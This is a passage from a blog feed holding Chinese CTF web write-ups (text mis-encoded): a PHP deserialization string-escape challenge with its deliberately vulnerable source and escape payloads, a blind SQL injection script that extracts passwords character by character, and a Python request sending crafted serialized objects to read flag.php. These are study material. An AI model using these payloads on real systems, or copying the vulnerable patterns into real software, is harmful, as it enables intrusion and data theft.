single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><pre class="line-numbers language-none"><code class="language-none">extract($_POST); ç›´æ¥æŠŠposté‡Œçš„é”®å€¼å¯¹_SESSION[a]&#x3D;1ï¼Œa&#x3D;1è¿™ç§è¦†ç›–å˜é‡<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'a:2:&#123;i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";&#125;abc'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ç„¶å¯ä»¥è¾“å‡ºä¸Šé¢çš„ç»“æœï¼Œè¿™è¯´æ˜ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´çš„ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦(ç¬¬äºŒä¸ªä¾‹å­é‡Œçš„abc)éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'flagflagflagflagflagflag'</span>ï¼›<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'L2QwZzNfZmxsbGxsbGFn'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>a:3:&#123;s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡è®¾åå°å­˜åœ¨ä¸€ä¸ªè¿‡æ»¤æœºåˆ¶ï¼Œä¼šå°†å«flagå­—ç¬¦æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆä»¥ä¸Šåºåˆ—åŒ–å­—ç¬¦ä¸²è¿‡æ»¤ç»“æœä¸º</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">59</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"dd"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬äºŒä¸ªsæ‰€å¯¹åº”çš„æ•°å­—ï¼Œæœ¬æ¥ç”±äºæœ‰6ä¸ªflagå­—ç¬¦æ‰€ä»¥ä¸º24ï¼Œç°åœ¨è¿™6ä¸ªflagéƒ½è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå®ƒå°†ä¼šå°è¯•å‘åè¯»å–24ä¸ªå­—ç¬¦çœ‹çœ‹æ˜¯å¦æ»¡è¶³åºåˆ—åŒ–çš„è§„åˆ™ï¼Œ<br>ä¹Ÿå³è¯»å–;s:8:â€functionâ€;s:59:â€a,è¯»å–è¿™24ä¸ªå­—ç¬¦åä»¥â€;ç»“å°¾ï¼Œæ°å¥½æ»¡è¶³è§„åˆ™ï¼Œè€Œåç¬¬ä¸‰ä¸ªså‘åè¯»å–imgçš„20ä¸ªå­—ç¬¦ï¼Œç¬¬å››ä¸ªã€ç¬¬äº”ä¸ªså‘åè¯»å–å‡æ»¡è¶³è§„åˆ™ï¼Œæ‰€ä»¥åºåˆ—åŒ–ç»“æœä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">array(3) &#123;[&quot;user&quot;]&#x3D;&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;[&quot;img&quot;]&#x3D;&gt; string(20) &quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;[&quot;dd&quot;]&#x3D;&gt; string(1) &quot;a&quot;&#125;$_SESSION[&quot;user&quot;]&#x3D;&#39;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#39;;$_SESSION[&quot;img&quot;]&#x3D;&#39;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&#39;;$_SESSION[&quot;dd&quot;]&#x3D;&#39;a&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»¼ä¸Šï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">#æ–¹æ³•ä¸€</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>    <span class="token comment">#ç»“æœ a:1:&#123;s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;ï¼Œè¿™é‡Œå°±é€ æˆimgä¸æˆä¸ºä¸€ä¸ªé”®ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡ŒåŠ å¯†</span>    <span class="token comment">#è¿‡æ»¤æ‰flagæœ‰</span>    <span class="token comment">#a:1:&#123;s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;</span>    <span class="token comment"># ";s:51:"å˜æˆå­—ç¬¦ä¸²å€¼ï¼Œè¿™æ—¶imgæˆåŠŸé€ƒé€¸å‡ºæ¥</span>â€‹    <span class="token comment">#æ–¹æ³•äºŒ</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagphp'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">';s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>    <span class="token comment">#æ–¹æ³•ä¸‰</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:2:"aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>â€‹<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[BJDCTF 2nd]ç®€å•æ³¨å…¥</title>
      <link href="/p/1156766915.html"/>
      <url>/p/1156766915.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/image-20210720190936565.png" alt="image-20210720190936565"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BJDCTF-2nd-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/image-20210720190939695.png" alt="image-20210720190939695"></p><pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ä¼ å…¥admin\å’Œor&#x2F;**&#x2F;length(database())&gt;0#ä¼šå›æ˜¾strongerå­—æ ·ä¼ å…¥admin\å’Œor&#x2F;**&#x2F;length(database())&lt;0#ä¼šå›æ˜¾girl friendå­—æ ·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://0f34fb9a-d697-428e-8383-5e31b7f7cdd0.node3.buuoj.cn/index.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin\\"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span> <span class="token comment"># python è¿™é‡Œä¹Ÿè¦è½¬ä¹‰</span>result <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># payload = "or/**/if(ascii(substr(username,%d,1))>%d,1,0)#"%(i,mid)</span>        payload <span class="token operator">=</span> <span class="token string">"or/**/if(ascii(substr(password,%d,1))>%d,1,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"stronger"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    last <span class="token operator">=</span> result    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>protected/privateååºåˆ—åŒ–ä¸­pythonå‘åŒ…æ³¨æ„ç‚¹</title>
      <link href="/p/2019161034.html"/>
      <url>/p/2019161034.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©åšäº†é“ååºåˆ—çš„é¢˜ï¼Œ<code>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</code><br>ååºåˆ—é¢˜ä¸€ç›´éƒ½ä¸å¤ªä¼šåšï¼Œè¿™é“é¢˜å…¶ä¸­ä¹Ÿæœ‰è¯¸å¤šç–‘é—®ï¼Œäºæ˜¯æ­å»ºäº†ä¸ªç¯å¢ƒè®¤çœŸç ”ç©¶äº†ä¸‹</p><p>åŸé¢˜çš„wpä¸­ä¸»è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ˜æ„Ÿï¼Œå¯è½¬åŒ–ä¸ºpublicç»•è¿‡</p><h2 id="æ”¹åŠ¨"><a href="#æ”¹åŠ¨" class="headerlink" title="æ”¹åŠ¨"></a>æ”¹åŠ¨</h2><p>ç„¶åæˆ‘æŠŠé¢˜ç›®æ”¹äº†ä¸‹ï¼ŒæŠŠ<code>function is_valid($s)&#123;&#125;</code>åˆ æ‰ï¼Œç›®çš„æ˜¯æƒ³ç ”ç©¶ä¸‹protectedå˜é‡çš„ååºåˆ—åŒ–é—®é¢˜ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../../../WWW/localhost/flag.php"</span><span class="token punctuation">;</span>     <span class="token comment">//è¿™é‡Œé‚£ä¹ˆé•¿æ˜¯å› ä¸ºååºåˆ—åè·¯å¾„å˜åˆ°php.exeé‚£é‡Œï¼Œéœ€è¦æ”¹ä¸‹ç›®å½•æˆ–è€…å¹²è„†ç»å¯¹è·¯å¾„</span><span class="token punctuation">&#125;</span><span class="token variable">$A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$B</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$B</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµè§ˆå™¨åˆ·æ–°ä¸‹ï¼Œå¤åˆ¶ä¸‹æ¥</p><pre class="line-numbers language-none"><code class="language-none">O:11:&quot;FileHandler&quot;:2:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:31:&quot;..&#x2F;..&#x2F;..&#x2F;WWW&#x2F;localhost&#x2F;flag.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„s:5:â€*opâ€ï¼Œå®é™…ä¸Šæ˜¯æœ‰ä¸€ä¸ªasciiç ä¸º0çš„ä¸å¯è§å­—ç¬¦åœ¨é‡Œé¢ï¼Œæ‰€ä»¥é•¿åº¦æ˜¯5ä¸æ˜¯2ã€‚</p><p>å¦‚æœé•¿åº¦é”™è¯¯ååºåˆ—åŒ–å°±æ˜¯å¤±è´¥ã€‚</p><p>æ‰€ä»¥å¦‚æœæ˜¯è¿™ä¸¤ä¸ªå˜é‡çš„è¯éœ€è¦æ‰‹åŠ¨æ”¹æˆä»¥ä¸‹è¿™æ ·çš„å½¢å¼ã€‚</p><p>privateï¼š</p><pre class="line-numbers language-none"><code class="language-none">\x00ç±»å\x00å˜é‡å\0ç±»å\0å˜é‡å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>protectedï¼š</p><pre class="line-numbers language-none"><code class="language-none">\x00*\x00å˜é‡å\0*\0å˜é‡å<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç„¶åè¦æ³¨æ„çš„æ˜¯å› ä¸ºurlè§£ç ä¼šæŠŠè¿™äº›å­—ç¬¦è½¬åŒ–æ‰ï¼Œç»æµ‹è¯•è°·æ­Œæµè§ˆå™¨å’Œburpsuiteéƒ½æ²¡åŠæ³•æ­£ç¡®ä¼ å€¼ï¼Œæ‰€ä»¥è¦ç”¨pythonå‘åŒ…</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//?str=\0*\0</span><span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// ä»€ä¹ˆéƒ½æ²¡æœ‰</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// \0*\0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>pythonå‘åŒ…ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://localhost/test2.php/?str=O:11:"FileHandler":2:&#123;s:5:"\0*\0op";i:2;s:11:"\0*\0filename";s:31:"../../../WWW/localhost/flag.php";&#125;'</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™é‡Œåˆæ‰å…¥äº†ä¸€ä¸ªå‘ï¼Œå¹³æ—¶å†™å­—ç¬¦ä¸²éƒ½å–œæ¬¢åŠ ä¸ªrï¼Œå†™ä»€ä¹ˆæ˜¯ä»€ä¹ˆä¸è®©å®ƒè‡ªåŠ¨è½¬ä¹‰ï¼Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">r'http://localhost/test2.php/?str=O:11:"FileHandler":2:&#123;s:5:"\0*\0op";i:2;s:11:"\0*\0filename";s:31:"../../../WWW/localhost/flag.php";&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ¬¡æˆ‘åŠ äº†rï¼Œå®é™…æ˜¯å¤šæ¬¡ä¸€ä¸¾ã€‚</p><p>å†™<code>\x00*\x00</code>æˆ–<code>\0*\0</code>æœ¬æ„å°±æ˜¯è®©å®ƒåœ¨å‘åŒ…çš„æ—¶å€™è‡ªåŠ¨è½¬ä¹‰ï¼ŒåŠ äº†råè€ŒæŠŠ16è¿›åˆ¶å½“åšå­—ç¬¦ä¸²ä¼ è¿‡å»ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚</p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>ä¸ºä»€ä¹ˆåˆ æ‰åŸä»£ç ä¸­çš„<code>$str = (string)$_GET[&#39;str&#39;];</code>ï¼Œååºåˆ—åŒ–ä¼šå¤±è´¥ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> requests </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jupyter Notebook å³é”®ç›´æ¥æ‰“å¼€ä¸€äº‹</title>
      <link href="/p/257582186.html"/>
      <url>/p/257582186.html</url>
      
